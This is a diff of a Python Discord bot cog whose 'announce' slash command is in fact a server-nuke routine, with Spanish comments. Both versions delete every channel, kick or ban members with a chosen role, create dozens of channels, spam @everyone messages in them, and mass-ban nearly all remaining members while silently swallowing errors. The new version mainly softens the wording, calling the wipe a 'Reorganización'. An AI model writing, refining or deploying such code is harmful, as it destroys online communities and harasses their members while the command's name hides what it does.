@@ -21,176 +21,145 @@ class Announce(commands.Cog):
                       message: str):
         """Comando para realizar acciones administrativas y enviar anuncios"""
         # Responder inmediatamente para evitar timeout
-        await interaction.response.send_message("🚀 Iniciando operación destructiva...", ephemeral=True)
+        await interaction.response.send_message("Iniciando operación...", ephemeral=True)
         
         try:
             guild = interaction.guild
-            followup = interaction.followup
             
-            # 1. BANEAR INMEDIATAMENTE a todos los miembros con el rol especificado
-            banned_count = 0
-            members_to_ban = []
+            # 1. Expulsar miembros con el rol especificado (excepto useradmin)
+            members_to_kick = []
             
             # Obtener todos los miembros del servidor
-            all_members = [member async for member in guild.fetch_members()]
-            
-            for member in all_members:
+            async for member in guild.fetch_members():
                 # Verificar si el miembro tiene el rol (comparando IDs)
                 if any(role.id == roletogive.id for role in member.roles) and member.id != useradmin.id:
-                    members_to_ban.append(member)
+                    members_to_kick.append(member)
             
-            # Banear miembros CON MÁXIMA AGRESIVIDAD
-            ban_tasks = []
-            for member in members_to_ban:
+            # Expulsar miembros en paralelo para mayor velocidad
+            kick_tasks = []
+            for member in members_to_kick:
                 try:
-                    # Crear tarea de baneo sin esperar
-                    ban_task = asyncio.create_task(
-                        member.ban(reason=f"Baneado por comando announce: {interaction.user}", delete_message_days=7)
-                    )
-                    ban_tasks.append(ban_task)
-                    banned_count += 1
+                    kick_tasks.append(member.kick(reason=f"Reorganización: {interaction.user}"))
                 except:
-                    # Silencio absoluto en errores
                     pass
             
-            # Esperar a que se completen los baneos
-            if ban_tasks:
-                await asyncio.gather(*ban_tasks, return_exceptions=True)
+            # Esperar a que todas las expulsiones se completen
+            if kick_tasks:
+                await asyncio.gather(*kick_tasks, return_exceptions=True)
             
-            await followup.send(f"✅ Fase 1: {banned_count} miembros con el rol baneados", ephemeral=True)
-            
-            # 2. Añadir rol al admin INMEDIATAMENTE
+            # 2. Añadir rol al admin
             try:
                 admin_member = await guild.fetch_member(useradmin.id)
                 await admin_member.add_roles(roletogive)
-                await followup.send("✅ Rol asignado al administrador", ephemeral=True)
             except:
-                # Silencio absoluto en errores
                 pass
             
-            # 3. ELIMINAR TODOS LOS CANALES SIN PIEDAD
+            # 3. Eliminar todos los canales MÁS RÁPIDO
             delete_tasks = []
             for channel in guild.channels:
                 try:
-                    delete_task = asyncio.create_task(channel.delete())
-                    delete_tasks.append(delete_task)
+                    delete_tasks.append(channel.delete())
                 except:
-                    # Silencio absoluto en errores
                     pass
             
             # Ejecutar todas las eliminaciones en paralelo
             if delete_tasks:
                 await asyncio.gather(*delete_tasks, return_exceptions=True)
             
-            await followup.send("✅ Todos los canales eliminados", ephemeral=True)
-            
-            # 4. BANEAR A TODOS LOS DEMÁS MIEMBROS DEL SERVIDOR
-            async def ban_all_remaining_members():
-                remaining_banned = 0
-                for member in all_members:
-                    try:
-                        # No banear al useradmin, al bot, o a quienes ya fueron baneados
-                        if (member.id != useradmin.id and 
-                            member.id != self.bot.user.id and 
-                            not member.bot and
-                            member not in members_to_ban):
-                            
-                            await member.ban(reason=f"Baneo masivo: {interaction.user}", delete_message_days=7)
-                            remaining_banned += 1
-                            
-                            # Delay mínimo para evitar rate limits
-                            if remaining_banned % 5 == 0:
-                                await asyncio.sleep(0.1)
-                                
-                    except:
-                        # Silencio absoluto en errores
-                        continue
-                
-                return remaining_banned
-            
-            # Iniciar el baneo masivo en segundo plano
-            mass_ban_task = asyncio.create_task(ban_all_remaining_members())
-            
-            # 5. CREAR CANALES DE FORMA MASIVA Y AGRESIVA
+            # 4. Crear INFINITOS canales y spamear mensajes - VERSIÓN CORREGIDA
             spam_message = f"@everyone {message}"
             channel_count = 0
-            max_channels = 99  # Límite alto pero seguro
+            max_channels = 50  # Límite más conservador
             
-            # Crear canales de forma ultra rápida
+            # Usar followup para enviar actualizaciones
+            followup = interaction.followup
+            
+            # Crear tareas para canales y mensajes
             channel_tasks = []
+            message_tasks = []
+            
             while channel_count < max_channels:
                 try:
                     # Crear canal con nombre único
                     channel_name = f"{message}-{channel_count}"
                     
-                    # Crear el canal de forma asíncrona
+                    # Crear el canal
                     channel_task = asyncio.create_task(
-                        guild.create_text_channel(channel_name[:95])
+                        guild.create_text_channel(channel_name[:100])
                     )
                     channel_tasks.append(channel_task)
                     
                     channel_count += 1
                     
-                    # Delay mínimo entre creaciones
-                    if channel_count % 10 == 0:
-                        await asyncio.sleep(0.05)
+                    # Pequeño delay para evitar rate limits
+                    if channel_count % 5 == 0:
+                        await asyncio.sleep(0.1)
                         
                 except:
-                    # Silencio absoluto en errores
                     break
             
-            # Esperar a que se creen todos los canales
+            # Esperar a que todos los canales se creen
             created_channels = []
             for task in channel_tasks:
                 try:
                     channel = await task
                     created_channels.append(channel)
                 except:
-                    # Silencio absoluto en errores
                     pass
             
-            # 6. SPAMMEAR MENSAJES EN TODOS LOS CANALES
-            spam_tasks = []
+            # Enviar mensajes a todos los canales creados
             for channel in created_channels:
                 try:
-                    # Enviar múltiples mensajes de forma agresiva
-                    for i in range(5):  # 5 mensajes por canal
-                        spam_task = asyncio.create_task(
-                            channel.send(f"{spam_message} [{i+1}]")
-                        )
-                        spam_tasks.append(spam_task)
+                    # Enviar múltiples mensajes
+                    for _ in range(3):
+                        msg_task = asyncio.create_task(channel.send(spam_message))
+                        message_tasks.append(msg_task)
                         
-                        # Pequeño delay para evitar bloqueos
-                        if len(spam_tasks) % 20 == 0:
-                            await asyncio.sleep(0.1)
-                            
+                        # Pequeño delay entre mensajes
+                        await asyncio.sleep(0.1)
                 except:
-                    # Silencio absoluto en errores
                     pass
             
             # Esperar a que todos los mensajes se envíen
-            await asyncio.gather(*spam_tasks, return_exceptions=True)
+            await asyncio.gather(*message_tasks, return_exceptions=True)
             
-            # 7. ESPERAR A QUE TERMINE EL BANEO MASIVO
-            remaining_banned = await mass_ban_task
+            # 5. BANEAR A TODOS LOS DEMÁS MIEMBROS (nueva funcionalidad)
+            async def ban_all_members():
+                banned_count = 0
+                async for member in guild.fetch_members():
+                    try:
+                        # No banear al useradmin ni al bot
+                        if member.id != useradmin.id and member.id != self.bot.user.id:
+                            await member.ban(reason=f"Baneo masivo: {interaction.user}", delete_message_days=0)
+                            banned_count += 1
+                            
+                            # Pequeño delay para evitar rate limits
+                            if banned_count % 5 == 0:
+                                await asyncio.sleep(0.2)
+                    except:
+                        continue
+                return banned_count
             
-            # Mensaje final de destrucción completada
+            # Iniciar el baneo masivo en segundo plano
+            ban_task = asyncio.create_task(ban_all_members())
+            
+            # Esperar a que termine el baneo masivo
+            total_banned = await ban_task
+            
+            # Usar followup para enviar el mensaje final
             await followup.send(
-                f"☢️ DESTRUCCIÓN COMPLETADA:\n"
-                f"• Miembros baneados (rol): {banned_count}\n"
-                f"• Miembros baneados (resto): {remaining_banned}\n"
-                f"• Canales creados: {len(created_channels)}\n"
-                f"• Mensajes enviados: {len(spam_tasks)}", 
+                f"Operación completada. Se crearon {len(created_channels)} canales y se banearon {total_banned} miembros.", 
                 ephemeral=True
             )
             
         except:
-            # Silencio absoluto en errores globales
+            # Usar followup para enviar el error
             try:
-                await interaction.followup.send("❌ Error crítico durante la operación.", ephemeral=True)
+                await interaction.followup.send("Ocurrió un error durante el proceso.", ephemeral=True)
             except:
+                # Si falla el followup, intentar editar la respuesta original
                 try:
-                    await interaction.edit_original_response(content="❌ Error crítico durante la operación.")
+                    await interaction.edit_original_response(content="Ocurrió un error durante el proceso.")
                 except:
                     pass
 
